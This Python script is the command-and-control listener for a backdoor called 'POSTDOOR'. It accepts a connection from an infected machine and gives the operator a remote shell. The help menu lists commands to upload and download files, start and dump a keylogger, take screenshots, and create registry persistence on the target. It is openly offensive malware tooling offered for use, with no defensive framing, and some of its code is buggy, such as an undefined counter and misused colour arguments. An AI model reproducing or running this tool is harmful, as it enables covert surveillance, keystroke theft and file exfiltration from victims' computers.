import socket
import termcolor
import json
import os

print("""
██████╗  ██████╗ ███████╗████████╗██████╗  ██████╗  ██████╗ ██████╗ 
██╔══██╗██╔═══██╗██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗
██████╔╝██║   ██║███████╗   ██║   ██║  ██║██║   ██║██║   ██║██████╔╝
██╔═══╝ ██║   ██║╚════██║   ██║   ██║  ██║██║   ██║██║   ██║██╔══██╗
██║     ╚██████╔╝███████║   ██║   ██████╔╝╚██████╔╝╚██████╔╝██║  ██║
╚═╝      ╚═════╝ ╚══════╝   ╚═╝   ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
                                                                    
      """,'yellow')

startup_info = """!!!This script is the listner for the backdoor. 
You will find the link for github repo. here:
*Note: please wait for 20 seconds after execution of backdoor. 
	   due to delay of 20 second*
Type 'help' to view the manual.
example : 
LHOST=192.168.54.2
LPORT=443\n"""
print(startup_info,'blue')

def reliable_send(data):
	jsondata = json.dumps(data)
	target.send(jsondata.encode())

def reliable_recv():
	data = ''
	while True:
		try:
			data = data + target.recv(1024).decode().rstrip()
			return json.loads(data)
		except ValueError:
			continue

def upload_file(file_name):
        f = open(file_name, 'rb')
        target.send(f.read())


def download_file(file_name):
	f = open(file_name, 'wb')
	target.settimeout(1)
	chunk = target.recv(1024)
	while chunk:
		f.write(chunk)
		try:
			chunk = target.recv(1024)
		except socket.timeout as e:
			break
	target.settimeout(None)
	f.close()


def target_communication():
	while True:
		command = input('* Shell~%s: ' % str(ip))
		reliable_send(command)
		if command == 'quit':
			break
		elif command == 'help':
			print(termcolor.colored('''\n
            help                                --> Show this manual.
            quit                                --> Quit Session With The Target
            clear                               --> Clear The Screen
            cd *Directory Name*                 --> Changes Directory On Target System
            upload *file name*                  --> Upload File To The target Machine
            download *file name*                --> Download File From Target Machine
            keylog_start                        --> Start The Keylogger
            keylog_dump                         --> Print Keystrokes That The Target Inputted
            keylog_stop                         --> Stop And Self Destruct Keylogger File
            persistence *RegName* *fileName*    --> Create Persistence In Registry'''),'green')
		elif command == 'clear':
			os.system('clear')
		elif command[:3] == 'cd ':
			pass
		elif command[:8] == 'download':
			download_file(command[9:])
		elif command[:6] == 'upload':
			upload_file(command[7:])
		elif command[:10] == 'screenshot':
			f = open('screenshot%d' % (count), 'wb')
			target.settimeout(3)
			chunk = target.recv(1024)
			while chunk:
				f.write(chunk)
				try:
					chunk = target.recv(1024)
				except socket.timeout as e:
					break
			target.settimeout(None)
			f.close()
			count += 1
		else:
			result = reliable_recv()
			print(result)


host=input("[*] LHOST=")
port=int(input("[*] LPORT="))
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((host,port))
print(termcolor.colored('[+] Listening For The Incoming Connections', 'green'))
sock.listen(5)
target, ip = sock.accept()
print(termcolor.colored('[+] Target Connected From: ' + str(ip), 'green'))
target_communication()
